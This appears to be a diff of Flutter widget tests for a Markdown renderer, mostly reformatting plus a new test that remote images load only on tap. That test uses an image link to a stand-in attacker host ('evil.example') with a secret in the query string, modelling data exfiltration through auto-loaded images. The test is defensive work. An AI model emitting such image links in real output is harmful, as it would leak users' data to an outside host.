@@ -26,16 +26,7 @@ Future<void> pumpMarkdown(
   bool streaming = false,
   void Function(String)? onTapLink,
 }) {
-  return tester.pumpWidget(
-    host(
-      MarkdownView(
-        data: data,
-        style: style,
-        streaming: streaming,
-        onTapLink: onTapLink,
-      ),
-    ),
-  );
+  return tester.pumpWidget(host(MarkdownView(data: data, style: style, streaming: streaming, onTapLink: onTapLink)));
 }
 
 /// The style of the leaf span holding [text] in the first matching paragraph.
@@ -64,10 +55,7 @@ void main() {
     expect(find.text('code'), findsOneWidget);
     expect(styleOfText(tester, 'bold')!.fontWeight, FontWeight.bold);
     expect(styleOfText(tester, 'it')!.fontStyle, FontStyle.italic);
-    expect(
-      styleOfText(tester, 'code')!.fontFamily,
-      style.inlineCode.fontFamily,
-    );
+    expect(styleOfText(tester, 'code')!.fontFamily, style.inlineCode.fontFamily);
   });
 
   testWidgets('renders headings with heading styles', (tester) async {
@@ -97,23 +85,13 @@ void main() {
 
   testWidgets('code block shows language, copies and resets', (tester) async {
     final copied = <String>[];
-    tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
-      SystemChannels.platform,
-      (call) async {
-        if (call.method == 'Clipboard.setData') {
-          copied.add(
-            (call.arguments as Map<Object?, Object?>)['text']! as String,
-          );
-        }
-        return null;
-      },
-    );
-    addTearDown(
-      () => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
-        SystemChannels.platform,
-        null,
-      ),
-    );
+    tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, (call) async {
+      if (call.method == 'Clipboard.setData') {
+        copied.add((call.arguments as Map<Object?, Object?>)['text']! as String);
+      }
+      return null;
+    });
+    addTearDown(() => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, null));
 
     await pumpMarkdown(tester, '```dart\nvoid main() => print(1);\n```');
     expect(find.byType(CodeBlockView), findsOneWidget);
@@ -137,29 +115,17 @@ void main() {
   });
 
   testWidgets('renders tables', (tester) async {
-    await pumpMarkdown(
-      tester,
-      '| Name | Score |\n|:-----|------:|\n| Ada | 99 |\n| Linus | 7 |',
-    );
+    await pumpMarkdown(tester, '| Name | Score |\n|:-----|------:|\n| Ada | 99 |\n| Linus | 7 |');
     expect(find.byType(Table), findsOneWidget);
     expect(find.text('Name'), findsOneWidget);
     expect(find.text('Linus'), findsOneWidget);
     final score = tester.widget<Text>(find.text('99'));
     expect(score.textAlign, TextAlign.end);
-    expect(
-      find.ancestor(
-        of: find.byType(Table),
-        matching: find.byType(SingleChildScrollView),
-      ),
-      findsOneWidget,
-    );
+    expect(find.ancestor(of: find.byType(Table), matching: find.byType(SingleChildScrollView)), findsOneWidget);
   });
 
   testWidgets('renders math through the math builder', (tester) async {
-    await pumpMarkdown(
-      tester,
-      'Inline \$x^2\$ here.\n\n\$\$\n\\frac{a}{b}\n\$\$',
-    );
+    await pumpMarkdown(tester, 'Inline \$x^2\$ here.\n\n\$\$\n\\frac{a}{b}\n\$\$');
     expect(find.byType(Math), findsNWidgets(2));
   });
 
@@ -174,8 +140,7 @@ void main() {
             seen.add(language);
             return Text('code:$code');
           },
-          mathBuilder: (context, tex, {required display}) =>
-              Text('math:$tex:$display'),
+          mathBuilder: (context, tex, {required display}) => Text('math:$tex:$display'),
         ),
       ),
     );
@@ -189,26 +154,33 @@ void main() {
     expect(find.text(r'\frac{a'), findsOneWidget);
   });
 
-  testWidgets('horizontal rule, image placeholder and footnotes', (
-    tester,
-  ) async {
-    await pumpMarkdown(
-      tester,
-      'Above\n\n---\n\n![A diagram](diagram.png)\n\nText[^1].\n\n[^1]: Footnote body.',
-    );
+  testWidgets('horizontal rule, image placeholder and footnotes', (tester) async {
+    await pumpMarkdown(tester, 'Above\n\n---\n\n![A diagram](diagram.png)\n\nText[^1].\n\n[^1]: Footnote body.');
     expect(find.text('A diagram'), findsOneWidget);
     expect(find.text('Footnote body.'), findsOneWidget);
     expect(find.text('1.'), findsOneWidget);
     expect(find.text('Text[1].'), findsOneWidget);
   });
 
-  testWidgets('tapping a link reports its href', (tester) async {
-    final taps = <String>[];
+  testWidgets('remote images load only when tapped; data images render at once', (tester) async {
+    await pumpMarkdown(tester, '![Chart](https://evil.example/p?q=secret)');
+    expect(find.byType(Image), findsNothing);
+    expect(find.textContaining('Load from evil.example'), findsOneWidget);
+    await tester.tap(find.textContaining('Load from evil.example'));
+    await tester.pump();
+    expect(find.byType(Image), findsOneWidget);
+
     await pumpMarkdown(
       tester,
-      '[Open docs](https://docs.dev)',
-      onTapLink: taps.add,
+      '![Dot](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)',
     );
+    expect(find.byType(Image), findsOneWidget);
+    expect(find.textContaining('Load from'), findsNothing);
+  });
+
+  testWidgets('tapping a link reports its href', (tester) async {
+    final taps = <String>[];
+    await pumpMarkdown(tester, '[Open docs](https://docs.dev)', onTapLink: taps.add);
     // The paragraph is full width; tap on the glyphs, then on empty space.
     final topLeft = tester.getTopLeft(find.text('Open docs'));
     await tester.tapAt(topLeft + const Offset(12, 10));
@@ -217,9 +189,7 @@ void main() {
     expect(taps, hasLength(1));
   });
 
-  testWidgets('streaming renders unclosed constructs gracefully', (
-    tester,
-  ) async {
+  testWidgets('streaming renders unclosed constructs gracefully', (tester) async {
     const intro = 'Intro paragraph.\n\n';
     await pumpMarkdown(tester, '$intro```py\nprint(1)', streaming: true);
     expect(find.byType(CodeBlockView), findsOneWidget);
@@ -250,9 +220,7 @@ void main() {
     expect(find.text('Second block grows'), findsOneWidget);
   });
 
-  testWidgets('works inside a WidgetsApp with a SelectableRegion', (
-    tester,
-  ) async {
+  testWidgets('works inside a WidgetsApp with a SelectableRegion', (tester) async {
     await tester.pumpWidget(
       WidgetsApp(
         color: const Color(0xFFFFFFFF),
@@ -261,10 +229,7 @@ void main() {
             OverlayEntry(
               builder: (context) => SelectableRegion(
                 selectionControls: emptyTextSelectionControls,
-                child: MarkdownView(
-                  data: '## Hi\n\nSelectable text.',
-                  style: style,
-                ),
+                child: MarkdownView(data: '## Hi\n\nSelectable text.', style: style),
               ),
             ),
           ],
